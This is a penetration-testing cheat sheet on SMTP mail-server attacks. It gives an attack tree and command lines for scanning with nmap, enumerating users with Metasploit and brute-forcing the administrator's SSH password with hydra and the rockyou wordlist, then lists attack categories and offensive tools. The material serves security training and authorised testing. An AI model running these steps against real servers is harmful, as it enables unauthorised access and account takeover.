# SMTP exploits

## Attack tree

```text
1 Port scan
2 Recon
    2.1 Detect version
    2.2 Enumerate users
    2.3 Identify possible exploits
3 Exploit
```

## Example

Run a port scan against the email server (first try 25):

```text
# nmap -A -p 25 <IP address mailserver>
```

Detect SMTP version:

```text
# msfconsole
msf > search smtp_version
```

Research Mail Transfer Agent (MTA). Things that can help:

* When connecting, the greeting (code 220) will often spell out Postfix
* Common error messages are not strictly standardised - deliberately triggering an error (syntax, non-existing 
address, ...) will often return a message unique to one software
* Many providers will publish what they use (almost have to, in order to hire specialists)

Enumerate users:

```text
msf > search smtp_enum
```

Crack SSH password:

```text
# hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <IP address mailserver> ssh
```

SSH into the server as the user:

```text
# ssh administrator@<IP address mailserver>
```

## Notes

The Simple Mail Transfer Protocol (SMTP) is the Internet protocol for sending email. 
SMTP uses TCP port 25.

There are eight basic categories of SMTP exploits:

* Cleartext sniffing of authentication, email messages, and attachments; banner grabbing
* Relaying spam and phishing
* Email account enumeration
* Brute forcing account passwords
* Buffer overflows for arbitrary code execution
* Privilege escalation
* Denial of service
* Authentication bypass

## Tools

* [Wireshark](https://www.wireshark.org/download.html)
* [Cain](https://web.archive.org/web/20190603235413/http://www.oxid.it/cain.html)
* [Ettercap](https://www.ettercap-project.org/)
* [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit)
* [Nmap: smtp-user-enum.nse](https://nmap.org/nsedoc/scripts/smtp-user-enum.html)
* [Nmap: smtp-vuln-cve2010-4344.nse](https://nmap.org/nsedoc/scripts/smtp-vuln-cve2010-4344.html)
* [Metasploit: auxiliary/scanner/smtp/smtp_version](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/smtp/smtp_version)
* [Metasploit: auxiliary/scanner/smtp/smtp_enum](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/smtp/smtp_enumm)
* [Metasploit: exploit/windows/email/ms07_017_ani_loadimage_chunksize](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/email/ms07_017_ani_loadimage_chunksize)
* [Hydra](https://github.com/vanhauser-thc/thc-hydra)
* [Medusa](https://github.com/jmk-foofus/medusa)